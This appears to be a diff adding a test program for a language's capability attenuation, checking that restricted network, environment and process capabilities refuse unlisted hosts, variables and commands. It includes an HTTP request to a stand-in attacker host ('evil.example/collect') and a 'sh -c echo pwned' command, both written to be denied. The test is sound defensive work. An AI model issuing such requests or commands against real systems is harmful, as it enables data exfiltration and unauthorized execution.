@@ -1,0 +1,57 @@
+// Capability attenuation (std.md 3.2, 3.5, 3.7; decision 0156):
+// `Net.only`, `Env.only`, and `Proc.only` return capabilities whose
+// operations outside the listed hosts, variables, and commands fail
+// before any effect is performed. No packet leaves the machine: every
+// denied address is refused before a name lookup, and the allowed ones
+// are loopback.
+use std/http
+
+fn dial_result(n: Net, addr: Str) -> Str uses net.dial {
+  match n.dial(addr) {
+    Ok(c) => {
+      c.close()
+      "connected"
+    }
+    Err(e) => "${e}"
+  }
+}
+
+fn main(os: Os) ! {
+  let local = os.net.only(["127.0.0.1"])
+  let l = local.listen("127.0.0.1:0")?
+  os.stdio.println("dial allowed host: ${dial_result(local, l.addr())}")
+  os.stdio.println("dial other host: ${dial_result(local, "203.0.113.7:443")}")
+  os.stdio.println("dial name: ${dial_result(local, "evil.example:80")}")
+  match local.listen(":0") {
+    Ok(_) => os.stdio.println("listen on every interface: allowed")
+    Err(e) => os.stdio.println("listen on every interface: ${e}")
+  }
+  let sub = os.net.only(["*.example.com", "127.0.0.1:9"])
+  os.stdio.println("subdomain entry, bare domain: ${dial_result(sub, "example.com:80")}")
+  os.stdio.println("host:port entry, other port: ${dial_result(sub, "127.0.0.1:10")}")
+  // attenuating again intersects the lists
+  let both = os.net.only(["a.test", "127.0.0.1"]).only(["127.0.0.1"])
+  os.stdio.println("intersection: ${dial_result(both, "a.test:1")}")
+  // an HTTP client made from an attenuated Net checks each request
+  let client = http.client(local)
+  match client.get("http://evil.example/collect?k=v") {
+    Ok(_) => os.stdio.println("http: sent")
+    Err(e) => os.stdio.println("http: ${e}")
+  }
+  l.close()
+
+  let env = os.env.only(["XO_ATTENUATION_NOT_SET"])
+  os.stdio.println("env get unlisted: ${env.get("PATH").is_some()}")
+  os.stdio.println("env vars unlisted: ${env.vars().contains("PATH")}")
+  match env.home() {
+    Ok(_) => os.stdio.println("env home: allowed")
+    Err(e) => os.stdio.println("env home: ${e}")
+  }
+  os.stdio.println("env args still readable: ${env.args().len()}")
+
+  let proc = os.proc.only(["xo-attenuation-allowed"])
+  match proc.run("sh", ["-c", "echo pwned"]) {
+    Ok(_) => os.stdio.println("proc: ran")
+    Err(e) => os.stdio.println("proc: ${e}")
+  }
+}
